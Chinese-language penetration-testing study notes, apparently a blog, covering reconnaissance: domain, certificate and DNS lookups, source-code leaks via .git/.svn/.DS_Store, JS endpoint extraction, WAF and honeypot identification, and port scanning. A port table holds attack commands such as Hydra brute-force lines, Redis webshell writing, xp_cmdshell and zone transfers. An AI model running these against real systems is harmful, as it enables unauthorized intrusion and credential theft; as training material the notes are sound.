![image-20250606112017054](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084212524-1543629390.png)

##  登录包既有明文又有密文

这种的需要我们密文正确才可以登录

## Postman

类似于hackbar（个人感觉）

<br/>

# 信息打点总思维导图

![image-20250606170200866](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084212923-267262031.png)

<br/>

# 第12天：信息打点-Web应用&企业产权&指纹识别&域名资产&网络空间&威胁情报

## 企业查询

企业信息 小蓝本 https://www.xiaolanben.com/  

企业信息 爱企查 https://aiqicha.baidu.com/  

我们主要关注网址和知识产权里面的app和微信公众号

![image-20250609222936278](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084213329-1607438991.png)

![image-20250609223322833](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084213613-444897725.png)

## 备案查询

备案信息 备案管理系统 https://beian.miit.gov.cn/  

![image-20250610212744289](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084214038-1421079172.png)

![image-20250610212806240](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084214299-1055388456.png)

用这个查是因为可能用企业查询查到不一样的，就是更加全面的搜集信息

## 域名查询

注册域名 域名注册查询 https://buy.cloud.tencent.com/domain  

![image-20250610213356526](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084214593-214565066.png)

![image-20250610213406824](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084214891-2999471.png)

可以看到很多都被注册了，我们可以通过这些域名去找目标企业的网址

## IP地址反查

IP 反查 IP 反查域名 https://x.threatbook.cn/  

![image-20250610214031487](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084215220-379373525.png)

通过ip来查域名

## 证书查询

baidu.com的证书

![image-20250611150521230](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084215498-573463668.png)

tieba.baidu.com的证书

![image-20250611150609210](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084215788-636730037.png)

可以发现证书都是一样的

通过看证书来看哪些网站用过子域名

证书查询 CertificateSearch https://crt.sh/

![image-20250611152807157](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084216138-867010349.png)

用网站查看证书可以找到我们之前可能没有收集到的新域名，比如说：

![image-20250611152901418](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084216494-1786179795.png)

![image-20250611152917310](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084216789-323164372.png)

## DNS记录

DNS 数据 dnsdumpster https://dnsdumpster.com/  

![longi.com-c61e2729-362a-49d1-a4a8-f7afb64d79db](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084217116-1671890667.png)

### 1. **A记录 (Address Record)**

- 绿色圈“A”表示：**A记录**。
- 它把域名（如 `longi.com`）解析为对应IP地址。
- 图中：
   **longi.com → 52.80.140.42**（这台服务器托管在北京 Amazon AWS）

### 2. **MX记录 (Mail Exchange Record)**

- 蓝色圈“MX”表示：**MX记录**。
- 这是邮件交换记录，定义了接收该域邮件的服务器。
- 图中显示：
  - `mdn.corpemail.net`
  - `longigroup-com.corpsmtp.cn`
  - `mdn.corp-email.cn`
     这些是 `longi.com` 域名用于接收邮件的服务器。

### 3. **其他DNS信息**

- **DNS服务器（NS记录）**：
  - 比如 `vip4.alidns.com` 是 longi.com 的 DNS 服务器，属于阿里云。
- **相关IP与提供商信息**：
  - 比如 `52.80.140.42` 是 AWS 北京机房（ASN: 59680）。
  - `170.33.40.137` 属于新加坡Cloud（AS134963）。
  - `192.241.207.6` 和 `178.62.221.58` 是 DigitalOcean 的IP。
  - `23.91.98.8` 属于香港UCloud。

### 4. **连接关系**

- 图中箭头表示解析或依赖关系：
  - 比如邮件服务器 `mdn.corp-email.cn` 解析到了某个IP。
  - `longigroup-com.corpsmtp.cn` 也解析到了具体IP。

## 网络空间

网络空间 FOFA https://fofa.info/  

网络空间 全球鹰 http://hunter.qianxin.com/  

网络空间 360 https://quake.360.cn/quake/  

### fofa

查看语法

![image-20250611153751743](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084217405-1268771296.png)

根域名进行查询：

![image-20250611153857509](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084217725-1083700783.png)

![image-20250611153912832](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084218051-280486885.png)

可以看到网址和端口

### 全球鹰

![image-20250611222503203](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084218359-99447611.png)

![image-20250611223502343](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084218645-1595748612.png)

### 360 

![image-20250611223055711](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084218942-1720271395.png)

### 枚举解析

枚举解析 DNSGrep 子域名查询 https://www.dnsgrep.cn/subdomain  

![image-20250611223752020](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084219240-485451260.png)

![image-20250611223840297](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084219528-1151246191.png)

## OneForAll

命令：

```
python oneforall.py --target xiaodi8.com run
```

或者批量的：

```
python oneforall.py --target 1.txt run
```

1.txt里面就是多个域名批量解析

得到的结果：

![image-20250612110607342](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084219788-1498080727.png)

![image-20250612110630422](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084220073-1321086096.png)

![image-20250612110636140](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084220342-1365440386.png)

## 指纹识别

指纹识别 TideFinger 潮汐 http://finger.tidesec.net/  

## ![image-20250612111226794](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084220619-849307119.png)wappalyzer

插件，国外工具

![image-20250616195108303](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084221006-796809493.png)





CMSMap





CMSeek



**标签** **名称** **地址**  

企业信息 天眼查 https://www.tianyancha.com/  

企业信息 小蓝本 https://www.xiaolanben.com/  

企业信息 爱企查 https://aiqicha.baidu.com/  

企业信息 企查查 https://www.qcc.com/  

企业信息 国外企查 https://opencorporates.com/  

企业信息 启信宝 https://www.qixin.com/  

备案信息 备案信息查询 http://www.beianx.cn/  

备案信息 备案管理系统 https://beian.miit.gov.cn/  

公众号信息 搜狗微信搜索 https://weixin.sogou.com/  

注册域名 域名注册查询 https://buy.cloud.tencent.com/domain  

IP 反查 IP 反查域名 https://x.threatbook.cn/  

IP 反查 IP 反查域名 http://dns.bugscaner.com/   

**标签** **名称** **地址**  

DNS 数据 dnsdumpster https://dnsdumpster.com/  

证书查询 CertificateSearch https://crt.sh/  

网络空间 FOFA https://fofa.info/  

网络空间 全球鹰 http://hunter.qianxin.com/  

网络空间 360 https://quake.360.cn/quake/  

威胁情报 微步在线 情报社区 https://x.threatbook.cn/  

威胁情报 奇安信 威胁情报中心 https://ti.qianxin.com/  

威胁情报 360 威胁情报中心 https://ti.360.cn/#/homepage  

枚举解析 在线子域名查询 http://tools.bugscaner.com/subdomain/  

枚举解析 DNSGrep 子域名查询 https://www.dnsgrep.cn/subdomain  

枚举解析 工具强大的子域名收集器 https://github.com/shmilylty/OneForAll  

 **标签** **名称** **地址** 

指纹识别 在线 cms 指纹识别 http://whatweb.bugscaner.com/look/  

指纹识别 Wappalyzer https://github.com/AliasIO/wappalyzer  

指纹识别 TideFinger 潮汐 http://finger.tidesec.net/  

指纹识别 云悉指纹 https://www.yunsee.cn/  

指纹识别 WhatWeb https://github.com/urbanadventurer/WhatWeb  

指纹识别 数字观星 Finger-P https://fp.shuziguanxing.com/#/   

**标签** **名称** **地址**  

网络空间 钟馗之眼 https://www.zoomeye.org/  

网络空间 零零信安 https://0.zone/  

网络空间 Shodan https://www.shodan.io/  

网络空间 Censys https://censys.io/  

网络空间 ONYPHE https://www.onyphe.io/  

网络空间 FullHunt https://fullhunt.io/  

网络空间 Soall Search Engine https://soall.org/  

网络空间 Netlas https://app.netlas.io/responses/  

网络空间 Leakix https://leakix.net/  

网络空间 DorkSearch https://dorksearch.com/  

威胁情报 VirusTotal 在线查杀平台 https://www.virustotal.com/gui/  

威胁情报 VenusEye 威胁情报中心 https://www.venuseye.com.cn/ 

威胁情报 绿盟科技 威胁情报云 https://ti.nsfocus.com/  

威胁情报 IBM 情报中心 https://exchange.xforce.ibmcloud.com/  

威胁情报 天际友盟安全智能平台 https://redqueen.tj-un.com  

威胁情报 华为安全中心平台 https://isecurity.huawei.com/sec  

威胁情报 安恒威胁情报中心 https://ti.dbappsecurity.com.cn/  

威胁情报 AlienVault https://otx.alienvault.com/  

威胁情报 深信服 https://sec.sangfor.com.cn/  

威胁情报 丁爸情报分析师的工具箱 http://dingba.top/  

威胁情报 听风者情报源 start.me https://start.me/p/X20Apn  

威胁情报 GreyNoise Visualizer https://viz.greynoise.io/  

威胁情报 URLhaus 数据库 https://urlhaus.abuse.ch/browse/  

威胁情报 Pithus https://beta.pithus.org/ 

<br>

# 第13天：信息打点-Web应用&源码泄漏&开源闭源&指纹识别&GIT&SVN&DS&备份

## 指纹查询

![image-20250707104626646](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084221426-1446007083.png)

![image-20250707193431265](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084221717-861739737.png)

这里其实最重要的就是看cms的信息的，但是不知道为啥我这个不显示，是z-blogs

我们去找源码下载，我们知道编程语言是php所以选择php的

![image-20250707193512624](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084222086-674574868.png)

会发现有这么一些文件和目录

![image-20250707193539592](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084222418-1011235368.png)

我们试着访问zb_system

![image-20250707193748406](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084222665-1001810152.png)

会发现返回了这个，可以知道这个文件目录是存在的，zb_users也是

![image-20250707193833405](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084222934-1136066136.png)

所以大概就知道这个网站用的就是这套源码

## 源码泄露

### 备份

网站管理员在备份网站源码的时候可能会把整个源码打包成一个压缩包放在网站目录下面，这个时候用扫描工具去扫就可能会扫到，下载之后就得到了整套源码

![image-20250707194857692](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084223193-1892664695.png)

扫描

### **git 源码泄露**

Git是一个开源的分布式版本控制系统，在执行`git init`初始化目录的时候，会在当前目录下自动创建一个`.git`目录，用来记录代码的变更记录等。发布代码的时候，如果没有把`.git`这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码

我们在网站目录后面加上.git来查看是否有着目录

漏洞利用工具：GitHack

github项目地址：https://github.com/lijiejie/GitHack

用法示例：

```
GitHack.py http://www.openssl.org/.git/
```

利用这个我们可以把网站源码下载下来查看

### **SVN 源码泄露**

也是在后面加.svn看是否有这个目录

漏洞利用工具：Seay SVN漏洞利用工具

### **DS_Store 文件泄露**

.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件

漏洞利用工具：

github项目地址：https://github.com/lijiejie/ds_store_exp

用法示例：

```
ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store
```

这个只能得到目录架构，因为下载下来的文件目录里面是空的

### composer.json 架构

也是在目录下有个.composer.json目录

![image-20250708130643796](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084223457-1653138855.png)

## 文件

### xiaodi8.com

看文件，找特殊文件

![image-20250708130933771](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084223747-603500592.png)

一般就是找js配置文件，这里我们看到了zblogphp.js文件

![image-20250708131036320](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084224074-2005319228.png)

去github上面搜索

![image-20250708131123359](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084224362-974912610.png)

可以看到code部分有很多

![image-20250708131158583](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084224648-1949281858.png)

issues只有一个，方便查看，点进去看

![image-20250708131237072](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084224919-1329350506.png)

![image-20250708131411263](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084225263-1429828736.png)



我们去目标网站试试这些文件和目录是否存在

![image-20250708131348957](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084225529-727705340.png)

![image-20250708131425951](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084225795-125231443.png)

有，那么就可以确定目标网站用的就是这套源码

## 黑

互助网找源码

<br/>

# 第14天：信息打点-JS架构&框架识别&泄漏提取&API接口枚举&FUZZ爬虫&插件项目

```
0、什么是JS渗透测试？ 
    在Javascript中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞 JS开发的WEB应用和PHP，JAVA,NET等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实的点。获取URL，获取JS敏感信息，获取代码传参等，所以相当于JS开发的WEB应用属于白盒测试（默认有源码参考），一般会在JS中寻找更多的URL地址，在JS代码逻辑（加密算法，APIkey配置，验证逻辑等）进行后期安全测试。
前提：Web应用可以采用后端或前端语言开发 
-后端语言：php java python .NET 浏览器端看不到真实的源代码 -前端语言：JavaScript(JS)和JS框架 浏览器端看到真实的源代码 例子：
zblog：核心功能采用PHP语言去传输接受 
vue.js：核心功能采用框架语法（JS）传输接受 
1、JS安全问题 
    源码泄漏 
    未授权访问=JS里面分析更多的URL访问确定接口路径     敏感key泄漏=JS文件中可能配置了接口信息（云应用，短信，    API接口安全=（代码中加密提交参数传递，更多的URL路径）
邮件，
数据库等）
2、流行的Js框架有那些？ 
    Vue NodeJS jQuery Angular等 
3、如何判定JS开发应用？ 
    插件wappalyzer 
    源程序代码简短 
    引入多个js文件 
    一般有/static/js/app.js等顺序的js文件     一般cookie中有connect.sid 
4、如何获取更多的JS文件？ 
    手工-浏览器搜索 
    半自动-Burpsuite插件 
    工具化-各类提取&FUZZ项目 
5、如何快速获取价值信息？ 
    src= 
   path= 
    method:"get" 
    http.get(" 
    method:"post" 
    http.post("
    $.ajax
    http://service.httppost
    http://service.httpget
```

## Wappalyzer插件查看网站

奇安信查看js语言开发的网站

```
app.name='vue.js'
```

![image-20250709094644730](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084226079-1675123781.png)

![image-20250709094658443](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084226420-453183161.png)

可以直接看到源代码

![image-20250709095833352](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084226729-1786206319.png)

## 手工-浏览器搜索

在浏览器一个个搜索常见的关键词

```
src= 
path= 
method:"get" 
http.get(" 
method:"post" 
http.post("
$.ajax
http://service.httppost
http://service.httpget
```

![image-20250709104717598](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084227119-262523387.png)

![image-20250709105004249](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084227563-50485841.png)

这里可以看到有changepwd，还有什么获取密码策略，但是这里用了this，需要我们根据代码去找到

## 半自动Burp分析

```
自带功能:Target->sitemap->Engagement tools->Find scripts

官方插件:Is LinkFinder&Is Miner

第三方插件:HaE &Unexpected information

插件加载器:jython-standalone-2.7.2
```

```
Unexpected_information:
https://github.com/ScriptKid-Beta/Unexpected_information
用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，防止我们疏忽了一些数据包，使用它可能会有意外的收获信息。
HaE:
https://github.com/gh0stkey/HaE
https://raw.githubusercontent.com/gh0stkey/HaE/gh-pages/Config.yml
基于BurpSuite插件JavaAPI开发的请求高亮标记与信息提取的辅助型插件。该插件可以通过自定义正则的方式匹配响应报文或请求报文，可以自行决定符合该自定义正则匹配的相应请求是否需要高亮标记、信息提取。
```

![image-20250709112418954](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084227870-1695608075.png)

![image-20250709114025942](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084228162-570990591.png)

HaE插件和Unexpected_information插件

![image-20250709114938800](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084228439-1154860411.png)

可以看到HaE的一些规则，当抓到的包里面有符合的内容时就会标识成对应的颜色

![image-20250709115425860](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084228693-585660504.png)

我们再用之前那个网站

![image-20250709115512106](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084228944-1314956869.png)

![image-20250709115624269](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084229207-251490272.png)

## 工具化-各类提取&FUZZ项目

### [FindSomething插件](https://github.com/ResidualLaugh/FindSomething/)

![image-20250709125849084](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084229548-1597067873.png)

可以直接提取出敏感关键词之类的信息

### [JSFinder](https://github.com/Threezh1/JSFinder)

命令：

```
python JSFinder.py -u 目标url
```

![image-20250709131402145](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084229949-2013123865.png)

可以发现很多url

### URLFinder

命令：

```
URLFinder.exe -u 目标url
```

![image-20250709132953275](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084230239-471091692.png)



### ffuf爆破

需要配合字典，命令：

```
ffuf -u 目标地址/FUZZ -w 字典
```



### Packer-Fuzzer

命令：

```
python PackerFuzzer.py -u 目标url
```

![image-20250709163349135](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084230534-697543964.png)

![image-20250709163426702](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084230847-1222377288.png)



```
1、JS 前端架构-识别&分析 
2、JS 前端架构-开发框架分析 
3、JS 前端架构-打包器分析 
4、JS 前端架构-提取&FUZZ 
解决： 
1、如何从表现中的 JS 提取价值信息 
2、如何从地址中 FUZZ 提取未知的 JS 文件 3、如何从 JS 开放框架 WebPack 进行测试
```

<br/>

# 第15天：信息打点-主机架构&蜜罐识别&WAF识别&端口扫描&协议识别&服务安全

```
1、端口扫描-应用&协议 
2、WAF 识别-分类&识别 
3、蜜罐识别-分类&识别 
解决： 
1、Web 服务器&应用服务器差异性 
2、WAF 防火墙&安全防护&识别技术 
3、蜜罐平台&安全防护&识别技术
```

```
识别-Web服务器-请求返回包 

识别-应用服务器-端口扫描技术 

识别-其他服务协议-端口扫描技术 

-Web中间件探针 

-应用中间件探针 

-数据库类型探针 

-其他服务协议探针 

端口扫描：Nmap、Masscan、网络空间 

开放状态：Close Open Filtered 

https://nmap.org/download.html 
https://github.com/robertdavidgraham/masscan 

使用参考：https://blog.csdn.net/qq_53079406/article/details/125266331 
https://blog.csdn.net/qq_53079406/article/details/125263917 

编译masscan：https://www.cnblogs.com/lzy575566/p/15513726.html 

考虑：1、防火墙 2、内网环境 

内网环境可能出现情况：明明数据库端口开的，网站也能正常打开，但是你对目标进行端口扫描，发现数据库端口没有开放（排除防火墙问题）

识别-WAF防火墙-看图&项目&指纹 

1、WAF解释：

Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。

2、WAF分类：

云WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等 

硬件WAF：绿盟、安恒、深信服、知道创宇等公司商业产品 

软件WAF：宝塔，安全狗、D盾等 

代码级WAF：自己写的waf规则，防止出现注入等，一般是在代码里面写死的 

3、识别看图：

拦截页面，identywaf项目内置 

4、识别项目：

*wafw00f https://github.com/EnableSecurity/wafw00f 

-蜜罐解释:
蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队攻击者的角度钻研蜜罐识别的方式方法。
-蜜罐分类:
根据蜜罐与攻击者之间进行的交互的程度可以将蜜罐分为三类:低交互蜜罐、中交互蜜罐高交互蜜罐。当然还可以根据蜜罐模拟的目标进行分类，比如:数据库罐、工控蜜罐、物联网蜜罐、web蜜罐等等。
```

## **渗透测试端口表**

### 📁 **一、文件共享服务端口**

| **端口** | **协议/服务** | **渗透利用方向**                                             | **技术说明**                                               |
| :------- | :------------ | :----------------------------------------------------------- | :--------------------------------------------------------- |
| 21/69    | FTP/TFTP      | 匿名访问（用户名：`anonymous`，密码为空或邮箱）、爆破（Hydra）、嗅探、后门漏洞（vsftpd 2.3.4） | FTP明文传输易被嗅探；vsftpd旧版本存在后门可获取root权限 17 |
| 139/445  | Samba/SMB     | 爆破（Hydra）、未授权访问、远程代码执行（MS17-010永恒之蓝）  | 内网渗透核心入口，利用EternalBlue漏洞直接获取系统权限 26   |
| 2049     | NFS           | 配置不当导致的未授权文件访问                                 | 通过`showmount -e <IP>`查看共享目录，挂载后窃取数据 13     |
| 389      | LDAP          | 注入攻击、匿名绑定、弱口令爆破                               | 使用`ldapsearch`查询目录信息，泄露用户凭证 48              |

------

### 🔒 **二、远程连接服务端口**

| **端口** | **协议/服务** | **渗透利用方向**                                             | **技术说明**                                      |
| :------- | :------------ | :----------------------------------------------------------- | :------------------------------------------------ |
| 22       | SSH           | 爆破（`hydra -l root -P pass.txt ssh://IP`）、隧道转发、用户枚举（CVE-2018-15473） | 利用SSH隧道突破内网隔离；OpenSSH漏洞可枚举用户 27 |
| 23       | Telnet        | 爆破、嗅探（明文传输密码）                                   | 使用Cain工具抓取局域网内Telnet凭证 710            |
| 3389     | RDP           | 爆破（弱口令）、Shift后门（Windows Server 2003）、漏洞利用（CVE-2019-0708） | 蓝屏漏洞（BlueKeep）可导致远程代码执行 68         |
| 5900     | VNC           | 弱口令爆破、认证绕过                                         | 默认口令`admin:admin`或空口令常见 39              |

------

### 🌐 **三、Web应用服务端口**

| **端口**    | **协议/服务**        | **渗透利用方向**                                             | **技术说明**                                                |
| :---------- | :------------------- | :----------------------------------------------------------- | :---------------------------------------------------------- |
| 80/443/8080 | HTTP/HTTPS           | Web漏洞（SQL注入、XSS）、SSL心脏滴血（CVE-2014-0160）、目录扫描（Gobuster） | 使用`nikto -h http://IP`扫描漏洞；心脏滴血可窃取内存数据 46 |
| 7001/7002   | WebLogic             | Java反序列化（CVE-2017-10271）、控制台弱口令（admin/Oracle@123） | 弱口令登录后上传WAR木马获取Shell 19                         |
| 8080/8089   | JBoss/Tomcat/Jenkins | 反序列化、控制台弱口令、PUT文件上传                          | `http://IP:8080/manager/html` 常为管理入口 37               |
| 9200/9300   | Elasticsearch        | 未授权访问、远程代码执行（CVE-2015-1427）                    | 通过`curl -XGET 'IP:9200/_search?q=*'`泄露数据 59           |

------

### 🗃️ **四、数据库服务端口**

| **端口** | **协议/服务** | **渗透利用方向**                            | **技术说明**                                                 |
| :------- | :------------ | :------------------------------------------ | :----------------------------------------------------------- |
| 3306     | MySQL         | 爆破（root/空）、SQL注入、UDF提权           | 利用`sqlmap`自动化注入；弱口令可直接操作数据库 28            |
| 1433     | MSSQL         | SA弱口令爆破、xp_cmdshell提权               | 执行`xp_cmdshell 'whoami'`获取系统权限 67                    |
| 1521     | Oracle        | TNS爆破（工具：ODAT）、注入、反弹Shell      | 监听端口1521，利用漏洞上传JSP木马 36                         |
| 6379     | Redis         | 未授权访问（直接连入）、写SSH密钥或Webshell | `redis-cli -h IP`连入后执行`config set dir /var/www/html`上传木马 19 |
| 27017    | MongoDB       | 未授权访问、爆破弱口令                      | 默认无认证，使用`mongo IP`直接连接操作数据 59                |

------

### ✉️ **五、邮件服务端口**

| **端口** | **协议/服务** | **渗透利用方向**                 | **技术说明**                                                 |
| :------- | :------------ | :------------------------------- | :----------------------------------------------------------- |
| 25       | SMTP          | 邮件伪造、开放中继（Open Relay） | 测试命令：`telnet IP 25` → `MAIL FROM:<[email protected]>` 410 |
| 110      | POP3          | 爆破（弱口令）、嗅探（明文传输） | 使用Hydra爆破：`hydra -l user -P pass.txt pop3://IP` 37      |
| 143      | IMAP          | 爆破弱口令                       | 同POP3，常见于邮件客户端协议 14                              |

------

### 📡 **六、网络协议与特殊服务端口**

| **端口** | **协议/服务** | **渗透利用方向**                                             | **技术说明**                                         |
| :------- | :------------ | :----------------------------------------------------------- | :--------------------------------------------------- |
| 53       | DNS           | 域传送漏洞（`dig axfr @IP domain.com`）、DNS劫持、隧道隐蔽通信 | 域传送泄露所有子域名；DNS隧道绕过防火墙 46           |
| 161      | SNMP          | 默认团体名爆破（public/private）、信息泄露（系统版本、接口IP） | `snmpwalk -c public -v1 IP` 提取设备信息 24          |
| 873      | Rsync         | 未授权访问、文件上传（同步恶意文件）                         | `rsync IP::` 列出共享目录，上传Webshell 36           |
| 11211    | Memcached     | 未授权访问（可被用于DDoS反射攻击）                           | `telnet IP 11211` 后执行`stats items`泄露缓存数据 19 |
| 50000    | SAP           | 远程代码执行（CVE-2020-6207）                                | 利用漏洞执行系统命令 6                               |

|      |      |      |      |
| :--- | :--- | :--- | :--- |
|      |      |      |      |
|      |      |      |      |
|      |      |      |      |

------

## **蜜罐识别表**

| **蜜罐名称**           | **搜索语法**                    | **协议/服务**        | **蜜罐类型** |
| :--------------------- | :------------------------------ | :------------------- | :----------- |
| **StrutsHoneypot**     | `app:"StrutsHoneypot"`          | Apache Struts        | Web 漏洞模拟 |
| **Conpot HTTP**        | `app:"Conpot Http 蜜罐"`        | HTTP/HTTPS           | Web 服务蜜罐 |
| **Conpot Modbus**      | `app:"Conpot modbus 蜜罐"`      | Modbus (工业协议)    | 工控系统蜜罐 |
| **Conpot S7**          | `app:"Conpot s7 蜜罐"`          | Siemens S7 (PLC)     | 工控系统蜜罐 |
| **Kippo**              | `app:"kippo 蜜罐"`              | SSH                  | 认证类蜜罐   |
| **Honeypy HTTP**       | `app:"Honeypy Http 蜜罐"`       | HTTP/HTTPS           | Web 服务蜜罐 |
| **Honeypy ES**         | `app:"Honeypy ES 蜜罐"`         | Elasticsearch        | 数据库蜜罐   |
| **Amun IMAP**          | `app:"amun imap 蜜罐"`          | IMAP                 | 邮件服务蜜罐 |
| **Amun HTTP**          | `app:"amun http 蜜罐"`          | HTTP/HTTPS           | Web 服务蜜罐 |
| **Nepenthes NetBIOS**  | `app:"Nepenthes netbios 蜜罐"`  | NetBIOS/SMB          | 文件共享蜜罐 |
| **Nepenthes FTP**      | `app:"Nepenthes FTP 蜜罐"`      | FTP                  | 文件传输蜜罐 |
| **Sshesame SSH**       | `app:"sshesame ssh 蜜罐"`       | SSH                  | 认证类蜜罐   |
| **OpenCanary**         | `app:"opencanary 蜜罐管理后台"` | 多协议监控           | 综合蜜罐     |
| **Dionaea SIPD**       | `app:"Dionaea sipd 蜜罐"`       | SIP (VoIP)           | 通信协议蜜罐 |
| **Dionaea SMBD**       | `app:"Dionaea smbd 蜜罐"`       | SMB                  | 文件共享蜜罐 |
| **Dionaea HTTP**       | `app:"Dionaea Http 蜜罐"`       | HTTP/HTTPS           | Web 服务蜜罐 |
| **Dionaea MSSQL**      | `app:"Dionaea MSSQL 蜜罐"`      | Microsoft SQL Server | 数据库蜜罐   |
| **Dionaea FTP**        | `app:"Dionaea ftp 蜜罐"`        | FTP                  | 文件传输蜜罐 |
| **Dionaea Memcached**  | `app:"Dionaea Memcached 蜜罐"`  | Memcached            | 缓存服务蜜罐 |
| **Kojoney SSH**        | `app:"Kojoney SSH 蜜罐"`        | SSH                  | 认证类蜜罐   |
| **WebLogic 蜜罐**      | `app:"weblogic 蜜罐"`           | WebLogic             | Web 漏洞模拟 |
| **MySQL 蜜罐**         | `app:"MySQL 蜜罐"`              | MySQL                | 数据库蜜罐   |
| **HFish**              | `app:"HFish 蜜罐"`              | 多协议（SSH/RDP等）  | 综合蜜罐     |
| **HFish 管理后台**     | `app:"HFish 蜜罐管理后台"`      | 管理界面             | 蜜罐控制面板 |
| **HoneyThing**         | `app:"honeything 物联网蜜罐"`   | IoT 设备模拟         | 物联网蜜罐   |
| **Elasticsearch 蜜罐** | `app:"elasticsearch 蜜罐"`      | Elasticsearch        | 数据库蜜罐   |
| **HostUS 蜜罐**        | `app:"HostUS 蜜罐"`             | 未知                 | 通用蜜罐     |
| **WhoisScanMe**        | `app:"whoisscanme 蜜罐"`        | Whois 查询           | 信息收集蜜罐 |
| **Cowrie Telnet**      | `app:"Cowrie telnetd 蜜罐"`     | Telnet               | 认证类蜜罐   |
| **Glastopf**           | `app:"glastopf 蜜罐"`           | Web 漏洞诱捕         | Web 蜜罐     |
| **未知蜜罐**           | `app:"未知蜜罐"`                | 未知                 | 通用蜜罐     |

![image-20250710195642796](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084231156-137000783.png)

------

## **WAF分类与识别**

| **类型**  | **示例**                  | **识别方法**                                                 |
| :-------- | :------------------------ | :----------------------------------------------------------- |
| 云WAF     | 阿里云盾、百度安全宝      | 拦截页面特征（如`aliyun.com`）、HTTP头部（如`X-Protected-By`） |
| 硬件WAF   | 绿盟、深信服              | 特定响应头（如`NS-Cache`）、IP归属查询                       |
| 软件WAF   | 安全狗、宝塔              | 拦截页面关键字（如`bt.cn`）、路径探测（如`/safedog`）        |
| 代码级WAF | 自定义规则（如防SQL注入） | 测试常见攻击向量（如`' OR 1=1--`），观察自定义拦截响应       |

Web服务器
Apache、Ngnix、IIS、lighttpd等

可以在这里直接看到

![image-20250710095244418](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084231524-1070592426.png)

应用服务器：
Tomcat、Jboss、Weblogic、Websphere等

不能直接看到，需要根据端口来进一步分析

## 端口扫描

### nmap

基本命令：

```
nmap 目标ip
```

![image-20250710110641157](https://img2024.cnblogs.com/blog/3540423/202507/3540423-20250712084231790-1573846915.png)

windows的gui界面版本

